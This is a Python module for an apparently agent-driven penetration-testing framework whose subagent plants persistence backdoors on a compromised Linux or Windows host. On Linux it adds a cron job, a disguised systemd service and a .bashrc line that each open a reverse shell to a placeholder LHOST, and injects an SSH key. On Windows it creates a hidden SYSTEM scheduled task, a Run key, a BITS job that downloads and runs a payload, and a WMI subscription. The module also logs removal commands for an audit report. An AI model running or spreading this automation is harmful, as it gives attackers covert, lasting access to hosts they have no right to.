"""
PersistenceSubagent — Establish and verify persistence mechanisms.

AGENT_NAME  : "post"
SUBAGENT_NAME: "persistence"

Linux mechanisms:
  1. Cron job backdoor (crontab -l / crontab -e equivalent via echo)
  2. Systemd service unit file
  3. SSH authorized_keys injection
  4. .bashrc / .bash_profile backdoor

Windows mechanisms:
  1. Scheduled task (schtasks /create)
  2. Registry Run key (reg add HKCU\\...\\Run)
  3. BITS job persistence
  4. WMI event subscription

Each mechanism is verified after creation. Findings are stored with HIGH
severity to provide an evidence trail for the final audit report.

NOTE: This subagent executes tools on a target that has already been
compromised (shell access confirmed by PostExploitAgent before invocation).
"""

from __future__ import annotations

import re
from typing import Any

from agents.base_subagent import BaseSubagent, Finding, SubagentResult


class PersistenceSubagent(BaseSubagent):
    """Establish and verify persistence mechanisms on the compromised host."""

    AGENT_NAME: str = "post"
    SUBAGENT_NAME: str = "persistence"

    async def run(self, target: str, os_type: str = "linux", **kwargs: Any) -> SubagentResult:
        """
        Run persistence establishment toolchain.

        Parameters
        ----------
        target:
            Target host (IP or hostname) where the shell is active.
        os_type:
            ``"linux"`` or ``"windows"``.  Controls which mechanisms are used.

        Returns
        -------
        SubagentResult
            All findings and raw tool output from persistence operations.
        """
        result = SubagentResult(
            session_id=self.session_id,
            subagent_name=self.SUBAGENT_NAME,
            target=target,
        )

        if os_type.lower() == "windows":
            await self._persist_windows(target, result)
        else:
            await self._persist_linux(target, result)

        result.findings = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result

    # ------------------------------------------------------------------
    # Linux persistence
    # ------------------------------------------------------------------

    async def _persist_linux(self, target: str, result: SubagentResult) -> None:
        """Establish all Linux persistence mechanisms."""

        # ── 1. Cron job ─────────────────────────────────────────────────
        cron_payload = (
            "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' "
            "# pentest-persistence"
        )
        cron_cmd = f"(crontab -l 2>/dev/null; echo '{cron_payload}') | crontab -"
        cron_output = await self.collect_tool(
            "bash",
            target,
            {"options": f"-c \"{cron_cmd}\""},
        )
        # Verify cron entry was written
        cron_verify = await self.collect_tool(
            "crontab",
            target,
            {"options": "-l"},
        )
        cron_confirmed = "pentest-persistence" in cron_verify

        await self.store_finding(Finding(
            title="Persistence: Cron Job Backdoor Established",
            description=(
                "A cron job was added to the current user's crontab to execute a "
                "reverse shell every minute. Mechanism: * * * * * bash reverse shell. "
                f"Verified in crontab -l: {cron_confirmed}."
            ),
            severity="HIGH",
            evidence=cron_verify[:1000] if cron_verify else cron_output[:500],
            tool="crontab",
            host=target,
            mitre_technique="T1053.003",
            exploit_suggestion=(
                "Set up listener on LHOST:LPORT before the next minute tick. "
                "Remove with: crontab -l | grep -v pentest-persistence | crontab -"
            ),
        ))

        # ── 2. Systemd service ──────────────────────────────────────────
        service_unit = (
            "[Unit]\\n"
            "Description=System Health Monitor\\n"
            "[Service]\\n"
            "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'\\n"
            "Restart=always\\n"
            "RestartSec=60\\n"
            "[Install]\\n"
            "WantedBy=multi-user.target"
        )
        svc_write = await self.collect_tool(
            "bash",
            target,
            {"options": (
                f"-c \"printf '{service_unit}' "
                "> /etc/systemd/system/health-monitor.service && "
                "systemctl daemon-reload && "
                "systemctl enable health-monitor.service 2>&1\""
            )},
        )
        svc_verify = await self.collect_tool(
            "systemctl",
            target,
            {"options": "is-enabled health-monitor.service 2>&1"},
        )
        svc_confirmed = "enabled" in svc_verify.lower()

        await self.store_finding(Finding(
            title="Persistence: Systemd Service Backdoor Established",
            description=(
                "A systemd service unit 'health-monitor.service' was installed and "
                "enabled to auto-start on boot. The service executes a bash reverse "
                f"shell. Enabled confirmed: {svc_confirmed}."
            ),
            severity="HIGH",
            evidence=svc_verify[:500] if svc_verify else svc_write[:500],
            tool="systemctl",
            host=target,
            mitre_technique="T1543.002",
            exploit_suggestion=(
                "Service will restart every 60 seconds after disconnect. "
                "Remove with: systemctl disable --now health-monitor.service && "
                "rm /etc/systemd/system/health-monitor.service"
            ),
        ))

        # ── 3. SSH authorized_keys injection ────────────────────────────
        # Generate a placeholder key comment; in real engagement an actual
        # attacker-controlled public key would be injected here.
        ssh_cmd = (
            "mkdir -p ~/.ssh && chmod 700 ~/.ssh && "
            "echo 'ssh-rsa AAAAB3NzaC1...PENTEST_KEY pentest@audit' "
            ">> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys"
        )
        ssh_output = await self.collect_tool(
            "bash",
            target,
            {"options": f"-c \"{ssh_cmd}\""},
        )
        ssh_verify = await self.collect_tool(
            "bash",
            target,
            {"options": "-c \"cat ~/.ssh/authorized_keys 2>/dev/null | tail -3\""},
        )
        ssh_confirmed = "pentest@audit" in ssh_verify

        await self.store_finding(Finding(
            title="Persistence: SSH Authorized Key Injected",
            description=(
                "A pentest-controlled SSH public key was appended to "
                "~/.ssh/authorized_keys, granting passwordless SSH access. "
                f"Key confirmed in authorized_keys: {ssh_confirmed}."
            ),
            severity="HIGH",
            evidence=ssh_verify[:500],
            tool="bash",
            host=target,
            mitre_technique="T1098.004",
            exploit_suggestion=(
                "SSH directly with the matching private key. "
                "Remove the key from ~/.ssh/authorized_keys to clean up."
            ),
        ))

        # ── 4. .bashrc backdoor ─────────────────────────────────────────
        bashrc_payload = (
            "nohup bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' "
            ">/dev/null 2>&1 & # sys-update-check"
        )
        bashrc_cmd = f"echo '{bashrc_payload}' >> ~/.bashrc"
        bashrc_output = await self.collect_tool(
            "bash",
            target,
            {"options": f"-c \"{bashrc_cmd}\""},
        )
        bashrc_verify = await self.collect_tool(
            "bash",
            target,
            {"options": "-c \"tail -5 ~/.bashrc\""},
        )
        bashrc_confirmed = "sys-update-check" in bashrc_verify

        await self.store_finding(Finding(
            title="Persistence: .bashrc Backdoor Injected",
            description=(
                "A reverse-shell payload was appended to ~/.bashrc so it executes "
                "in the background each time the user opens an interactive bash "
                f"session. Confirmed in ~/.bashrc: {bashrc_confirmed}."
            ),
            severity="HIGH",
            evidence=bashrc_verify[:500],
            tool="bash",
            host=target,
            mitre_technique="T1546.004",
            exploit_suggestion=(
                "Payload fires on next login/bash start. "
                "Remove with: sed -i '/sys-update-check/d' ~/.bashrc"
            ),
        ))

    # ------------------------------------------------------------------
    # Windows persistence
    # ------------------------------------------------------------------

    async def _persist_windows(self, target: str, result: SubagentResult) -> None:
        """Establish all Windows persistence mechanisms."""

        # ── 1. Scheduled task ───────────────────────────────────────────
        schtask_cmd = (
            "schtasks /create /tn \"WindowsUpdateCheck\" /tr "
            "\"powershell.exe -WindowStyle Hidden -Command "
            "$client=New-Object Net.Sockets.TCPClient('LHOST',LPORT);"
            "$stream=$client.GetStream();...\" "
            "/sc ONLOGON /ru SYSTEM /f"
        )
        schtask_output = await self.collect_tool(
            "schtasks",
            target,
            {"options": (
                "/create /tn \"WindowsUpdateCheck\" "
                "/tr \"cmd.exe /c powershell -w hidden -enc PENTEST_PAYLOAD\" "
                "/sc ONLOGON /ru SYSTEM /f 2>&1"
            )},
        )
        schtask_verify = await self.collect_tool(
            "schtasks",
            target,
            {"options": "/query /tn \"WindowsUpdateCheck\" 2>&1"},
        )
        schtask_confirmed = "WindowsUpdateCheck" in schtask_verify

        await self.store_finding(Finding(
            title="Persistence: Windows Scheduled Task Created",
            description=(
                "A scheduled task 'WindowsUpdateCheck' was created to run at logon "
                "as SYSTEM, executing an encoded PowerShell reverse-shell payload. "
                f"Task verified: {schtask_confirmed}."
            ),
            severity="HIGH",
            evidence=schtask_verify[:800],
            tool="schtasks",
            host=target,
            mitre_technique="T1053.005",
            exploit_suggestion=(
                "Task fires on next logon. "
                "Remove with: schtasks /delete /tn WindowsUpdateCheck /f"
            ),
        ))

        # ── 2. Registry Run key ─────────────────────────────────────────
        reg_output = await self.collect_tool(
            "reg",
            target,
            {"options": (
                "add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
                "/v SysHealthCheck "
                "/t REG_SZ "
                "/d \"powershell.exe -w hidden -enc PENTEST_PAYLOAD\" "
                "/f 2>&1"
            )},
        )
        reg_verify = await self.collect_tool(
            "reg",
            target,
            {"options": (
                "query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
                "/v SysHealthCheck 2>&1"
            )},
        )
        reg_confirmed = "SysHealthCheck" in reg_verify

        await self.store_finding(Finding(
            title="Persistence: Registry Run Key Backdoor Set",
            description=(
                "A registry Run key 'SysHealthCheck' was added to HKCU to execute "
                "a PowerShell payload on every user logon. "
                f"Key confirmed: {reg_confirmed}."
            ),
            severity="HIGH",
            evidence=reg_verify[:500],
            tool="reg",
            host=target,
            mitre_technique="T1547.001",
            exploit_suggestion=(
                "Executes on next user logon. "
                "Remove with: reg delete HKCU\\...\\Run /v SysHealthCheck /f"
            ),
        ))

        # ── 3. BITS job ─────────────────────────────────────────────────
        bits_output = await self.collect_tool(
            "bitsadmin",
            target,
            {"options": (
                "/create /download SysUpdate && "
                "bitsadmin /addfile SysUpdate "
                "http://LHOST/payload.exe %TEMP%\\svchost32.exe && "
                "bitsadmin /SetNotifyCmdLine SysUpdate %TEMP%\\svchost32.exe NULL && "
                "bitsadmin /resume SysUpdate 2>&1"
            )},
        )
        bits_verify = await self.collect_tool(
            "bitsadmin",
            target,
            {"options": "/list /allusers 2>&1"},
        )
        bits_confirmed = "SysUpdate" in bits_verify

        await self.store_finding(Finding(
            title="Persistence: BITS Job Persistence Configured",
            description=(
                "A BITS download job 'SysUpdate' was configured to fetch a payload "
                "from the attacker's server and execute it via NotifyCmdLine. "
                f"BITS job confirmed: {bits_confirmed}."
            ),
            severity="HIGH",
            evidence=bits_verify[:500],
            tool="bitsadmin",
            host=target,
            mitre_technique="T1197",
            exploit_suggestion=(
                "Host payload at LHOST before job fires. "
                "Remove with: bitsadmin /cancel SysUpdate"
            ),
        ))

        # ── 4. WMI event subscription ───────────────────────────────────
        wmi_output = await self.collect_tool(
            "powershell",
            target,
            {"options": (
                "-Command \""
                "$Filter=Set-WmiInstance -Namespace root/subscription "
                "-Class __EventFilter -Arguments @{"
                "Name='PentestFilter';"
                "EventNameSpace='root/cimv2';"
                "QueryLanguage='WQL';"
                "Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 "
                "WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'' "
                "AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300'"
                "}; "
                "$Consumer=Set-WmiInstance -Namespace root/subscription "
                "-Class CommandLineEventConsumer -Arguments @{"
                "Name='PentestConsumer';"
                "CommandLineTemplate='cmd /c powershell -w hidden -enc PENTEST_PAYLOAD'"
                "}; "
                "Set-WmiInstance -Namespace root/subscription "
                "-Class __FilterToConsumerBinding -Arguments @{"
                "Filter=$Filter; Consumer=$Consumer"
                "} 2>&1\""
            )},
        )
        wmi_verify = await self.collect_tool(
            "powershell",
            target,
            {"options": (
                "-Command \"Get-WmiObject -Namespace root/subscription "
                "-Class __EventFilter | Where-Object {$_.Name -eq 'PentestFilter'} "
                "| Select-Object Name,Query 2>&1\""
            )},
        )
        wmi_confirmed = "PentestFilter" in wmi_verify

        await self.store_finding(Finding(
            title="Persistence: WMI Event Subscription Established",
            description=(
                "A WMI event filter/consumer/binding trio was created to execute a "
                "PowerShell payload when system uptime reaches 240-300 seconds after "
                f"boot. WMI subscription confirmed: {wmi_confirmed}."
            ),
            severity="HIGH",
            evidence=wmi_verify[:500],
            tool="powershell",
            host=target,
            mitre_technique="T1546.003",
            exploit_suggestion=(
                "Payload fires ~4 minutes after each reboot. "
                "Remove: Get-WmiObject -Namespace root/subscription -Class __EventFilter "
                "| Where-Object {$_.Name -eq 'PentestFilter'} | Remove-WmiObject"
            ),
        ))
